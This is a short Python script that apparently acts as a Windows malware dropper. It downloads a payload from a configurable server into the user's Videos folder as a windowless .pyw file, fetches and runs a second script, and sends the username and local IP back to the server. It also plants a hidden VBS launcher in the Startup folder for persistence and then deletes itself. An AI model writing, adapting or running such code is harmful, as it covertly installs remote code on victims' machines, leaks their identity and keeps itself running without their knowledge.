import os
import getpass
import socket

os.system('pip install requests')

import requests


file_host = "http://127.0.0.1:5000"

with open(f"C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw","wb") as f:
# with open(f"C:\\Users\\Dell\\Videos\\file.py","wb") as f:
    r = requests.get(f'{file_host}/file1')
    f.write(r.content)

with open("fun.py","wb") as f:
    r = requests.get(f'{file_host}/fun')
    f.write(r.content)

requests.get(f'{file_host}/{getpass.getuser()}/{socket.gethostbyname(socket.gethostname())}')

with open(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\open.vbs', "w+") as file:
    file.write(f'CreateObject("Wscript.Shell").Run "pythonw C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw",0,True')


os.system('start python fun.py')

# delete this file after running it
os.remove(__file__)